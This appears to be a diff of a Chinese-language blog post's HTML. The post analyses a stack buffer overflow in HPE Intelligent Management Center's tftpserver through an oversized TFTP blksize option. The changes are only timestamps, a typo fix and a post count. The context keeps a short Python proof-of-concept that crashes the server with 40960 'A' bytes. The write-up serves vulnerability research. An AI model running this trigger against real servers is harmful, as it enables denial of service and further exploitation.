@@ -37,7 +37,7 @@
 <meta property="og:image" content="https://n0maj1o24.github.io/2022/05/15/HPE-Intelligent-Management-Center-Stack-Buffer-Overflow-In-tftpserver/04.png">
 <meta property="og:image" content="https://n0maj1o24.github.io/2022/05/15/HPE-Intelligent-Management-Center-Stack-Buffer-Overflow-In-tftpserver/01.png">
 <meta property="article:published_time" content="2022-05-14T21:54:10.000Z">
-<meta property="article:modified_time" content="2022-05-27T11:11:33.448Z">
+<meta property="article:modified_time" content="2022-05-28T08:28:06.042Z">
 <meta property="article:author" content="n0maj1o24">
 <meta property="article:tag" content="Windows">
 <meta property="article:tag" content="Stack Based Overflows">
@@ -238,7 +238,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-05-27 11:11:33" itemprop="dateModified" datetime="2022-05-27T11:11:33Z">2022-05-27</time>
+                <time title="修改时间：2022-05-28 08:28:06" itemprop="dateModified" datetime="2022-05-28T08:28:06Z">2022-05-28</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -293,7 +293,7 @@
 <p>继续跟进函数<code>sub_407730</code>:</p>
 <p><img src="/2022/05/15/HPE-Intelligent-Management-Center-Stack-Buffer-Overflow-In-tftpserver/09.png" alt="BOF"></p>
 <p>注意看，读取文件内容到之前申请的<code>9999bytes</code>空间里面去，而count又是用户可以控制的，那么，如果读取内容大于<code>9999bytes</code>，就会造成栈溢出。</p>
-<p>因为涉及的是<code>tftpserver</code>的漏洞利用，需要对<code>tftpserver</code>相关协议有一个了解，这里重点关注<a href="https://datatracker.ietf.org/doc/html/rfc2347" target="_blank" rel="noopener">RFC2347</a>即可。结合前面逆向的分析，这里漏洞点在<code>blksize</code>是我们可以控制的（但是这个值最大为<code>65535</code>），最后会带人上面的<code>count</code>参数，结合<code>tftpserver</code>读文件的时候，导致栈溢出。</p>
+<p>因为涉及的是<code>tftpserver</code>的漏洞利用，需要对<code>tftpserver</code>相关协议有一个了解，这里重点关注<a href="https://datatracker.ietf.org/doc/html/rfc2347" target="_blank" rel="noopener">RFC2347</a>即可。结合前面逆向的分析，这里漏洞点在<code>blksize</code>是我们可以控制的（但是这个值最大为<code>65535</code>），最后会带入上面的<code>count</code>参数，结合<code>tftpserver</code>读文件的时候，导致栈溢出。</p>
 <p>看一下能造成<code>crash</code>的脚本：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> tftpy</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">total_size = <span class="number">40960</span></span><br><span class="line">junk = <span class="string">b'\x41'</span>*total_size</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"crash.txt"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> filehander:</span><br><span class="line">    filehander.write(junk) </span><br><span class="line">client = tftpy.TftpClient(<span class="string">'127.0.0.1'</span>, <span class="number">69</span>)</span><br><span class="line">client.upload(<span class="string">'crash.txt'</span>, <span class="string">'crash.txt'</span>)</span><br><span class="line"></span><br><span class="line">client = tftpy.TftpClient(<span class="string">'127.0.0.1'</span>, <span class="number">69</span>, options=&#123;<span class="string">'blksize'</span>:<span class="number">10240</span>&#125;)</span><br><span class="line">client.download(<span class="string">'crash.txt'</span>,<span class="string">'download.txt'</span>)</span><br></pre></td></tr></table></figure>
 
@@ -438,7 +438,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">41</span>
+          <span class="site-state-item-count">42</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
